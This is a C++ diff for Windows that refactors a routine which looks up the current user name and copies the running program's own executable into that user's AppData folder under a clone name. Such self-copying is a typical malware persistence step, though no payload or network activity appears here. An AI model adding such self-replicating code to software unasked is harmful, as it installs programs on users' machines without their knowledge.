@@ -3,23 +3,23 @@
 #include "CP.h"
 #include <windows.h>
 #include <Lmcons.h>
+#include <stdio.h>
 
+void CP::execute() {
+	copy();
+}
 
-void CP::execute(){
-
+void CP::copy(){
+	char* filename = this->util.getFileName();
+	
 	string name;
 	TCHAR tcname[UNLEN + 1];
 	DWORD length = UNLEN + 1;
 	GetUserName(tcname, &length);
 	name = tcname;
 
-	char filename[MAX_PATH];
-	DWORD size = GetModuleFileNameA(NULL,filename, MAX_PATH);
-	string path = this->base + name + this->appData + "\\clone.exe";
-	//this->base.append(name);
+	this->path = this->base + name + this->appData + this->clone;
+	
 	BOOL response = 0;
-	CopyFile(filename,path.c_str(),response);
-	if (response) {
-		TRUE;
-	}
+	CopyFile(filename,this->path.c_str(),response);
 }
